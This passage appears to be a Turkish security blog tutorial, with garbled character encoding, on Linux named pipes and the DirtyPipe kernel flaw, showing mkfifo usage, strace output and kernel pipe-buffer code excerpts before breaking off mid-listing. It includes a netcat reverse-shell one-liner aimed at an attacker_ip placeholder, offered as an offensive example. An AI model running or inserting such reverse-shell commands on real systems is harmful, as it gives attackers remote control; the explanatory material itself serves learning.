<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€</span><span class="p">(</span><span class="n">root</span><span class="err">ã‰¿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
<span class="err">â””â”€#</span><span class="w"> </span><span class="n">mkfifo</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>

<span class="err">â”Œâ”€â”€</span><span class="p">(</span><span class="n">root</span><span class="err">ã‰¿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
<span class="err">â””â”€#</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"> </span>
<span class="n">prw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="mi">20</span><span class="o">:</span><span class="mi">18</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
</code></pre></div>

<p>Yazma veya okuma iÅŸlemi iÃ§in linux Ã¼zerindeki Ã§Ä±ktÄ± yÃ¶nlendirmeyi kullanabilirsiniz. <strong>Not: KullanÄ±cÄ±lara dikkat edin.</strong> </p>
<p>Yazma:</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€</span><span class="p">(</span><span class="n">root</span><span class="err">ã‰¿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ka1</span><span class="p">]</span><span class="w"></span>
<span class="err">â””â”€#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
</code></pre></div>

<p>Okuma:</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€</span><span class="p">(</span><span class="n">ka1</span><span class="err">ã‰¿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
<span class="err">â””â”€</span><span class="n">$</span><span class="w"> </span><span class="n">tail</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"> </span>
<span class="n">imam</span><span class="w"> </span><span class="n">hatipler</span><span class="w"> </span><span class="n">kapatilsin</span><span class="w"></span>
</code></pre></div>

<p>Dikkat</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€</span><span class="p">(</span><span class="n">ka1</span><span class="err">ã‰¿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
<span class="err">â””â”€</span><span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
<span class="nl">zsh</span><span class="p">:</span><span class="w"> </span><span class="n">permission</span><span class="w"> </span><span class="n">denied</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
</code></pre></div>

<p>AyrÄ±ca 2. bir dikkat etmemiz gereken ÅŸey ise tÄ±pkÄ± isimsiz pipeler gibi (neden belirtme gereÄŸi duyuyorum bilmiyorum ama, yani sonuÃ§ta pipe isimli de olsa isimsiz de olsa pipedÄ±r.) eÄŸer okuma yapmazsanÄ±z Ã¼zerine 2. bir veriyi yazamazsÄ±nÄ±z. Bu sebeple Ã§ift yÃ¶nlÃ¼ bir iÅŸlem yapmanÄ±z gerekir. Yok Ã¶yle abi her ÅŸeyi buraya atayÄ±m sonra okuyayÄ±m. Zaten Ã¶yle bir isteÄŸiniz varsa pipe kullanmanÄ±za gerek yok gidin dosya kullanÄ±n. </p>
<p>Åimdi bir de isimli borularÄ± kullanÄ±rken yaptÄ±ÄŸÄ±mÄ±z yÃ¶nlendirme iÅŸlemindeki kullanÄ±lan sistem Ã§aÄŸrÄ±larÄ±na bakalÄ±m:</p>
<div class="highlight"><pre><span></span><code><span class="n">trace</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">sh</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
<span class="nl">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">open</span><span class="w"> </span><span class="n">cat</span><span class="o">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"></span>
<span class="o">%</span><span class="w"> </span><span class="n">time</span><span class="w">     </span><span class="n">seconds</span><span class="w">  </span><span class="n">usecs</span><span class="o">/</span><span class="n">call</span><span class="w">     </span><span class="n">calls</span><span class="w">    </span><span class="n">errors</span><span class="w"> </span><span class="n">syscall</span><span class="w"></span>
<span class="o">------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">----------------</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">         </span><span class="mi">1</span><span class="w"> </span><span class="n">faccessat</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">         </span><span class="mi">1</span><span class="w"> </span><span class="n">openat</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">2</span><span class="w">           </span><span class="n">close</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">read</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">           </span><span class="n">write</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">4</span><span class="w">           </span><span class="n">newfstatat</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">set_tid_address</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">set_robust_list</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">rt_sigaction</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getpid</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getppid</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getuid</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">geteuid</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getgid</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">           </span><span class="n">brk</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">           </span><span class="n">munmap</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">execve</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">6</span><span class="w">           </span><span class="n">mmap</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">4</span><span class="w">           </span><span class="n">mprotect</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">prlimit64</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getrandom</span><span class="w"></span>
<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">rseq</span><span class="w"></span>
<span class="o">------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">----------------</span><span class="w"></span>
<span class="mf">100.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">        </span><span class="mi">42</span><span class="w">         </span><span class="mi">2</span><span class="w"> </span><span class="n">total</span><span class="w"></span>
</code></pre></div>

<p>Normal strace Ã§Ä±ktÄ±sÄ±na bakalÄ±m:</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€</span><span class="p">(</span><span class="n">root</span><span class="err">ã‰¿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ka1</span><span class="p">]</span><span class="w"></span>
<span class="err">â””â”€#</span><span class="w"> </span><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">qf</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">execve</span><span class="p">,</span><span class="n">pipe</span><span class="p">,</span><span class="n">write</span><span class="p">,</span><span class="n">read</span><span class="w"> </span>\
<span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="err">&#39;</span><span class="w"></span>
<span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cat temp.txt &gt; /tmp/ebucehil&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xffffd50935b8</span><span class="w"> </span><span class="cm">/* 32 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;temp.txt&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xaaaacda2fa88</span><span class="w"> </span><span class="cm">/* 32 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">25</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
<span class="o">---</span><span class="w"> </span><span class="n">SIGCHLD</span><span class="w"> </span><span class="p">{</span><span class="n">si_signo</span><span class="o">=</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="w"> </span><span class="n">si_code</span><span class="o">=</span><span class="n">CLD_EXITED</span><span class="p">,</span><span class="w"> </span><span class="n">si_pid</span><span class="o">=</span><span class="mi">530925</span><span class="p">,</span><span class="w"> </span><span class="n">si_uid</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_utime</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_stime</span><span class="o">=</span><span class="mi">0</span><span class="p">}</span><span class="w"> </span><span class="o">---</span><span class="w"></span>
<span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
</code></pre></div>

<p>YapÄ±lan sistem Ã§aÄŸrÄ±larÄ±na baktÄ±ÄŸÄ±mÄ±zda (en azÄ±ndan filtrelediklerimize) isimli borularÄ±n daha cimri olduÄŸunu gÃ¶rebiliriz. </p>
<p>DirtyPipe aÃ§Ä±ÄŸÄ±na geÃ§meden Ã¶nce offensive kullanÄ±m Ã¶rneÄŸi vermek amacÄ±yla isimli borularla ilgili dokunmak istediÄŸim bir ÅŸey var. Mknod/Mkfifo kullanarak reverse shell oluÅŸturabileceÄŸinizi ve kullanabileceÄŸiniz biliyor muydunuz?</p>
<div class="highlight"><pre><span></span><code><span class="n">mknod</span><span class="w"> </span><span class="n">backpipe</span><span class="w"> </span><span class="n">p</span><span class="p">;</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">attacker_ip</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="o">&lt;</span><span class="n">backpipe</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="mi">1</span><span class="o">&gt;</span><span class="n">backpipe</span><span class="w"></span>
</code></pre></div>

<p>2-3 belki daha Ã¶nce(telegram historyden baktÄ±m 2017â€™ymiÅŸ) ilgili komutu gÃ¶rdÃ¼ÄŸÃ¼mde gerÃ§ekten mindfuck geÃ§irmiÅŸtim fakat ÅŸimdi pipelarÄ± biraz da olsun Ã¶ÄŸrendiÄŸim iÃ§in neden olmasÄ±n ki diyebiliyorum. </p>
<p>Daha detaylÄ± bilgi iÃ§in:</p>
<p><a href="https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99">https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99</a></p>
<h2>DirtyPipe</h2>
<p>Direkt detaylÄ± bilgi: <a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></p>
<p>KÄ±saca: 2006 yÄ±lÄ±nda Linux Ã¼zerinde splice diye bir sistem Ã§aÄŸrÄ±sÄ± entegre edilmiÅŸ. Ä°lgili sistem Ã§aÄŸrÄ±sÄ± borular arasÄ±ndaki iletiÅŸimde tÃ¼m datanÄ±n kernelâ€™a gidip tekrardan userlandâ€™e geri dÃ¶nmemesi iÃ§in verimlilik adÄ±na kullanÄ±lmak amacÄ±yla ortaya Ã§Ä±kmÄ±ÅŸ tabi. Bunu da borular arasÄ±ndaki buffera alÄ±nan veriler iÃ§erisine â€œ<strong><em>*</em>*PIPE_BUF_FLAG_CAN_MERGE</strong>****â€ bayraÄŸÄ± ile saÄŸlamÄ±ÅŸlar. Buraya kadar her ÅŸey dÃ¼zgÃ¼n giderken bufferâ€™a eklenen her veri iÃ§erisine bu deÄŸer iÅŸlenmiÅŸ fakat ilgili refactoring dÃ¼zgÃ¼n iÅŸletilmediÄŸi veya kaÃ§Ä±rÄ±ldÄ±ÄŸÄ± iÃ§in ilgili bayrak, splice operasyonu sÄ±rasÄ±nda initialize edilmediÄŸi iÃ§in saldÄ±rgan kiÅŸiler initialize sÄ±rasÄ±nda istediÄŸi deÄŸerleri read-only buffer iÃ§erisine yazabilmiÅŸler. SonrasÄ± malum zaten.</p>
<p>KÄ±sacasÄ±ndan ziyade aÃ§Ä±klamaya girersek eÄŸer:</p>
<p>Borularda yazma iÅŸlemini gerÃ§ekleÅŸtiren <strong>pipe_write()</strong> fonksiyonu gerÃ§ekleÅŸtiriyor. EÄŸer boru boÅŸ deÄŸilse son buffer iÃ§erisindeki veri ile ÅŸu an ki veriyi birleÅŸtirmekle yÃ¼kÃ¼mlÃ¼. Bunu da pek tabi bayrak ile yapÄ±yor. Bunu yaparken de verileri farklÄ± bufferlarda tutabilmek iÃ§in aslÄ±nda 2 adet dallanma gerÃ§ekleÅŸtiriyor. Yazma iÅŸlemi yapacaÄŸÄ± zaman yeni oluÅŸturulan bufferâ€™Ä± <strong>â€œPIPE_BUF_FLAG_CAN_MERGEâ€</strong> olarak iÅŸaretliyor ki gelen veriler birleÅŸtirilebilsin. Veri akÄ±ÅŸÄ± bitene kadar da bu bayrak kullanÄ±lÄ±yor.  Yeni oluÅŸturulan buffer da doÄŸal olarak memory tableâ€™da belirli bir allocation iÅŸlemi gerÃ§ekleÅŸtiriyor. </p>
<div class="highlight"><pre><span></span><code><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">];</span><span class="w"> </span>
<span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">;</span><span class="w"></span>
<span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">anon_pipe_buf_ops</span><span class="p">;</span><span class="w"></span>
<span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_packetized</span><span class="p">(</span><span class="n">filp</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PIPE_BUF_FLAG_PACKET</span><span class="p">;</span><span class="w"></span>
<span class="w"> </span><span class="k">else</span><span class="w"></span>
<span class="w">   </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">;</span><span class="w"> </span>
<span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span>
<span class="w"> </span><span class="o">**</span><span class="n">copied</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">from</span><span class="p">);</span><span class="o">**</span><span class="w"></span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="n">pipe_buf_release</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="n">spin_lock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="n">tail</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">                </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tail</span><span class="p">;</span><span class="w"></span>
<span class="w">                </span><span class="n">spin_unlock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">            </span><span class="n">total_len</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">chars</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">total_len</span><span class="p">)</span><span class="w"></span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">  </span><span class="cm">/* common path: read succeeded */</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">pipe_empty</span><span class="p">(</span><span class="n">head</span><span class="p">,</span><span class="w"> </span><span class="n">tail</span><span class="p">))</span><span class="w">    </span><span class="cm">/* More to do? */</span><span class="w"></span>
<span class="w">                </span><span class="k">continue</span><span class="p">;</span><span class="w"></span>
</code></pre></div>

<p>copy_page_from_iter: </p>
<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">page</span><span class="w"> </span><span class="o">*</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="k">struct</span><span class="w"> </span><span class="nc">iov_iter</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_buffer</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span><span class="w"></span>
